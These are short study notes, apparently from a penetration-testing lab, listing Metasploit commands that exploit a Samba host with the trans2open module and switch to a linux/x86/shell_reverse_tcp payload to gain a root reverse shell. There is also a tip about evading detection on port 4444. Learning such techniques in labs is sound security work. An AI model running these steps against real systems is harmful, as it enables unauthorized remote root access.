# Gaining Root with Metasploit

- msfconsole
- search trans2open
- use <number>
- options
    - set RHOSTS <ip>
- show targets
- run (or exploit)
    - sending to stage is good
- In this case, it failed, so when you type options again it gives ‘payload options’
    - (LPORT 4444 likely will be detected IRL)
    - set payload <tab tab>
        - can find non-staged (the ones with underscores)
        - set payload linux/x86/shell_reverse_tcp
- exploit
- Got the shell
